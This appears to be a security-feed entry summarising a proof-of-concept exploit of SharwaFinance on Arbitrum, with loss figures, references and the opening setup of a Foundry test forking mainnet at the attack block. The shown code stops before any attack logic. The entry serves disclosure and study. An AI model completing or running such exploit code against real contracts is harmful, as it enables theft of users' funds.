# [?] SharwaFinance - Post Insolvency Check

## Summary
Severity: Unknown
Chain: Arbitrum
Component: SharwaFinance
Published: 2025-10-20
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-10/SharwaFinance_exp.sol
Type: defi-exploit-poc

## Details
Lost: 146,000 USD
References:
- https://app.blocksec.com/explorer/tx/arbitrum/0xd64729c528e6689cb18b0c90345ab0c9ed18fea44247c89af2f1374643fc89c2?line=-1
- https://app.blocksec.com/explorer/tx/arbitrum/0x9f8b4841f805ec50cc6632068f759216d85633fbbe34afde86b97bbc41c23ead
- https://x.com/phalcon_xyz/status/1980219745480946087?s=46
- https://blog.verichains.io/p/vulnerability-analysis-deconstructing?utm_source=chatgpt.com

```solidity
contract ContractTest is Test {
    address constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831; 
    address constant WBTC = 0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f;
    address constant MORPHO = 0x6c247b1F6182318877311737BaC0844bAa518F5e;
    address constant MARGIN_ACCOUNT_MANAGER = 0x7E859C254F431e566DaaB65f49b2449Aa826E395;
    address constant SF_LP_USDC = 0x02434cD23972C82FbAbf610D157b41bFB45A45a3;
    address constant MARGIN_TRADING_ROUTER = 0x35CB6a3b4963DaE3CB7465c954DDFBE0cd13eb2b;
    address constant TRADE_ROUTER = 0xd3fdE5AF30DA1F394d6e0D361B552648D0dff797;
    address constant V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    
    uint256 constant BLOCK_TX1 = 391402008;
    uint256 constant BLOCK_TX2 = 391402389;

    address attacker = address(this);
    AttackContract attackcontract;

    function setUp() public {
        vm.createSelectFork("arbitrum", BLOCK_TX1 - 1);
        vm.label(attacker, "Sharwa Finance Exploiter");
        vm.label(address(attackcontract), "Receiver");
        vm.label(USDC, "USDC");
        vm.label(WBTC, "WBTC");
        vm.label(MORPHO, "Morpho");
        vm.label(MARGIN_ACCOUNT_MANAGER, "MarginAccountManager");
        vm.label(TRADE_ROUTER, "TradeRouter");
        vm.label(SF_LP_USDC, "SF-LP-USDC");
        vm.label(MARGIN_TRADING_ROUTER, "MarginTradingRouter");
        vm.label(V3_ROUTER, "Uniswap V3: Router");

        attackcontract = new AttackContract(
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-10/SharwaFinance_exp.sol_
